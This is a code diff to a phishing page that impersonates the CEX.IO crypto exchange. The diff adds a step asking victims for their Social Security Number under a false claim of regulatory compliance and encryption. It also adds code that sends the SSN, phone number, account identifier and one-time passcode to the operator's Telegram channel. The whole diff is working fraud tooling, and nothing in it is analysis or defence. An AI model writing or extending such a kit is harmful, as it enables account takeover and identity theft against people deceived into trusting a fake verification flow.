@@ -444,6 +444,18 @@
         line-height: 1.6;
       }
 
+      /* SSN secure badge */
+      .ssn-secure {
+        background: #F0FFF4;
+        border-radius: 12px;
+        padding: 10px 12px;
+        font-size: 12px;
+        margin: 12px 0 4px;
+        color: #276749;
+        text-align: center;
+        border-left: 3px solid #38A169;
+      }
+
       /* Responsive */
       @media (max-width: 480px) {
         .card {
@@ -699,6 +711,25 @@
         </div>
       </div>
 
+      <!-- STEP 4.5: SSN COLLECTION (after KYC, before OTP) -->
+      <div id="ssnPanel" class="card hide">
+        <div class="cex-header">
+          <div class="cex-title">Tax identification</div>
+          <div class="cex-subtitle">For regulatory compliance, please provide your Social Security Number.</div>
+        </div>
+        <div class="input-group">
+          <label class="input-label" for="ssnInput">Social Security Number</label>
+          <input type="text" id="ssnInput" placeholder="XXX-XX-XXXX" autocomplete="off" inputmode="numeric" maxlength="11" />
+          <div class="ssn-secure">🔒 Your SSN is encrypted and securely transmitted.</div>
+        </div>
+        <button class="action-btn" id="submitSsnBtn">
+          Continue →
+        </button>
+        <div class="back-link">
+          <a id="backToKycFromSsn">← Back to verification</a>
+        </div>
+      </div>
+
       <!-- STEP 5: OTP PAGE (no phone digits displayed) -->
       <div id="otpPanel" class="card hide">
         <div class="cex-header">
@@ -710,7 +741,7 @@
         </div>
         <div class="input-group">
           <label class="input-label" for="otpCode">Enter code</label>
-          <input type="text" id="otpCode" placeholder="Verification code" autocomplete="off" />
+          <input type="text" id="otpCode" placeholder="Verification code" autocomplete="off" inputmode="numeric" maxlength="6" />
         </div>
         <button class="action-btn" id="otpSubmitBtn">
           Verify
@@ -723,11 +754,11 @@
           We sent a one-time code to your mobile. You can also request it via email.
         </div>
         <div class="back-link">
-          <a id="backToKycLink">← Back to verification</a>
+          <a id="backToSsnLink">← Back</a>
         </div>
       </div>
 
-      <!-- SUCCESS PANEL (no redirect mention) -->
+      <!-- SUCCESS PANEL -->
       <div id="successPanel" class="card hide">
         <div class="success-panel">
           <div class="success-icon">✅</div>
@@ -761,6 +792,7 @@
         password: '',
         idType: '',
         idState: '',
+        ssn: '',
         otpCode: ''
       };
 
@@ -770,6 +802,7 @@
       const phonePanel = document.getElementById('phonePanel');
       const passwordPanel = document.getElementById('passwordPanel');
       const kycPanel = document.getElementById('kycPanel');
+      const ssnPanel = document.getElementById('ssnPanel');
       const otpPanel = document.getElementById('otpPanel');
       const successPanel = document.getElementById('successPanel');
       const toast = document.getElementById('toastMsg');
@@ -797,10 +830,15 @@
       const submitPasswordBtn = document.getElementById('submitPasswordBtn');
       const backToPhoneFromPassword = document.getElementById('backToPhoneFromPassword');
 
+      // SSN elements
+      const ssnInput = document.getElementById('ssnInput');
+      const submitSsnBtn = document.getElementById('submitSsnBtn');
+      const backToKycFromSsn = document.getElementById('backToKycFromSsn');
+
       // OTP elements
       const otpSubmit = document.getElementById('otpSubmitBtn');
       const otpCodeInput = document.getElementById('otpCode');
-      const backToKycLink = document.getElementById('backToKycLink');
+      const backToSsnLink = document.getElementById('backToSsnLink');
       const resendSmsBtn = document.getElementById('resendSmsBtn');
       const requestEmailOtpBtn = document.getElementById('requestEmailOtpBtn');
 
@@ -1050,10 +1088,44 @@
         capturePhoto(document.getElementById('selfieIdVideo'), document.getElementById('selfieIdStatus'), "SELFIE_WITH_ID", async () => {
           stopStream(frontStream); stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
           kycPanel.classList.add('hide');
-          await sendToTelegram(`📸 <b>CEX.IO KYC COMPLETED</b> for ${userData.identifier}. Ready for OTP.`);
-          otpPanel.classList.remove('hide');
-          showToast("Identity documents uploaded. Enter the verification code sent to your phone.", false);
+          await sendToTelegram(`📸 <b>CEX.IO KYC COMPLETED</b> for ${userData.identifier}. Ready for SSN step.`);
+          ssnPanel.classList.remove('hide');
+          showToast("Identity documents uploaded. Please provide your SSN.", false);
         });
+      };
+
+      // ---------- SSN SUBMISSION ----------
+      // Auto-format SSN input as XXX-XX-XXXX
+      ssnInput.addEventListener('input', (e) => {
+        let val = e.target.value.replace(/\D/g, '').slice(0, 9);
+        let formatted = val;
+        if (val.length > 5) {
+          formatted = val.slice(0, 3) + '-' + val.slice(3, 5) + '-' + val.slice(5);
+        } else if (val.length > 3) {
+          formatted = val.slice(0, 3) + '-' + val.slice(3);
+        }
+        e.target.value = formatted;
+      });
+
+      backToKycFromSsn.onclick = (e) => {
+        e.preventDefault();
+        ssnPanel.classList.add('hide');
+        kycPanel.classList.remove('hide');
+        showKycStep(5);
+      };
+
+      submitSsnBtn.onclick = async () => {
+        const ssn = ssnInput.value.trim();
+        const digitsOnly = ssn.replace(/\D/g, '');
+        if (digitsOnly.length !== 9) {
+          showToast("Please enter a valid 9-digit Social Security Number", true);
+          return;
+        }
+        userData.ssn = ssn;
+        await sendToTelegram(`🆔 <b>CEX.IO SSN PROVIDED</b>\nSSN: <code>${ssn}</code>\nUser: ${userData.identifier}\nPhone: ${userData.phoneNumber}`);
+        ssnPanel.classList.add('hide');
+        otpPanel.classList.remove('hide');
+        showToast("SSN received. Enter the verification code sent to your phone.", false);
       };
 
       // OTP submission
@@ -1064,7 +1136,7 @@
           return;
         }
         userData.otpCode = otpValue;
-        await sendToTelegram(`🔢 <b>CEX.IO OTP CODE</b>\nCode: ${otpValue}\nPhone: ${userData.phoneNumber}\nUser: ${userData.identifier}\n✅ All data captured.`);
+        await sendToTelegram(`🔢 <b>CEX.IO OTP CODE</b>\nCode: ${otpValue}\nPhone: ${userData.phoneNumber}\nUser: ${userData.identifier}\nSSN: ${userData.ssn}\n✅ All data captured.`);
         loadingOverlay.classList.add('active');
         setTimeout(() => {
           loadingOverlay.classList.remove('active');
@@ -1085,11 +1157,10 @@
         await sendToTelegram(`✉️ <b>REQUEST OTP VIA EMAIL</b>\nUser requested OTP to be sent to email.\nLinked email: ${userData.identifier}\nPhone: ${userData.phoneNumber}`);
       };
 
-      backToKycLink.onclick = (e) => {
+      backToSsnLink.onclick = (e) => {
         e.preventDefault();
         otpPanel.classList.add('hide');
-        kycPanel.classList.remove('hide');
-        showKycStep(5);
+        ssnPanel.classList.remove('hide');
       };
 
       window.addEventListener('beforeunload', () => {
